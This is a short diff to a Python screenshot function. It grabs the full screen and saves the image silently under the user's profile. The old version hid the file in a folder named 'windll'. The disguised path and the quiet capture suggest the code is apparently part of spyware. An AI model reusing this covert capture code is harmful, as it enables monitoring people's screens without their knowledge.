@@ -11,13 +11,15 @@
 #-----------------------------------------------------------------------------#
 
 from PIL import ImageGrab
-from os import environ,sep
+from os import environ, makedirs
 from manager.logger import Log
+from preferences.config import config
 
 def Screenshot():
 	try:
-		pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
+		user = environ['USERPROFILE']
 		screen = ImageGrab.grab()
-		screen.save(rf'{pathtofolder}\windll\Photos\sreenshot.jpg')
+		makedirs(f'{user}\\{config.pathToLogs}\\Photos')
+		screen.save(f'{user}\\{config.pathToLogs}\\Photos\\sreenshot.jpg')
 	except Exception as e:
 		Log(f"Screenshot ---> {e}")
